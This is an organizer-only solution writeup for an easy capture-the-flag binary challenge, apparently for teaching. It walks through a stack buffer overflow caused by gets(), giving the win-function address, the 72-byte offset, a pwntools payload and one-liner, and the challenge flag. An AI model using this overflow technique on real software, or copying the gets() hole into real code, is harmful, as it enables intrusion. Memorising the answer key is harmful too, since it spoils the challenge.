# NEXUS-7 - Solution Writeup

> **ORGANIZER ONLY - DO NOT DISTRIBUTE**

## Challenge Overview

| Property | Value |
|----------|-------|
| **Name** | NEXUS-7 |
| **Category** | PWN |
| **Difficulty** | Easy |
| **Vulnerability** | Stack Buffer Overflow (ret2win) |
| **Flag** | `GTH{N3XUS_7_0V3RFL0W_3SC4P3}` |

---

## Vulnerability Analysis

### Location
In `send_distress_signal()`:

```c
char signal_buffer[64];
gets(signal_buffer);  // Classic buffer overflow!
```

### Goal
- Overflow `signal_buffer` to overwrite the return address
- Redirect execution to `emergency_override()` function
- This function reads and prints the flag

---

## Step-by-Step Solution

### 1. Check Binary Security

```bash
$ checksec --file=nexus7
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key: **No PIE** and **No canary** = easy overflow with fixed addresses.

### 2. Find the Win Function

```bash
$ nm nexus7 | grep emergency
0000000000401296 T emergency_override
```

Or in GDB:
```
(gdb) info functions emergency
0x0000000000401296  emergency_override
```

### 3. Calculate Offset

```
signal_buffer[64] + saved_RBP[8] = 72 bytes before return address
```

Verify with pattern:
```bash
$ python3 -c "from pwn import *; print(cyclic(100).decode())"
(gdb) run
# Enter option 3, paste pattern
# Check RSP after crash to find offset
```

### 4. Build Payload

```python
payload = b'A' * 72                    # Padding
payload += p64(0x401296)               # emergency_override address
```

### 5. Exploit

```bash
$ python3 exploit.py LOCAL
[+] emergency_override @ 0x401296
[+] Payload sent!
🚀 FLAG: GTH{N3XUS_7_0V3RFL0W_3SC4P3}
```

---

## Quick One-Liner

```bash
python3 -c "from pwn import *; print(b'A'*72 + p64(0x401296))" | ./nexus7
```

(Select option 3 first)

---

## Expected Player Approach

1. Notice `gets()` in source code (or via reverse engineering)
2. Find hidden `emergency_override()` function
3. Calculate buffer offset (64 + 8 = 72)
4. Craft payload to redirect execution
5. Get flag

---

## Difficulty Justification

- **Easy:** Source provided, `gets()` is obvious, no canary, no PIE
- **Learning:** Classic ret2win, good for beginners

---

## Tools Needed

- pwntools or manual payload construction
- Basic understanding of x86_64 calling convention
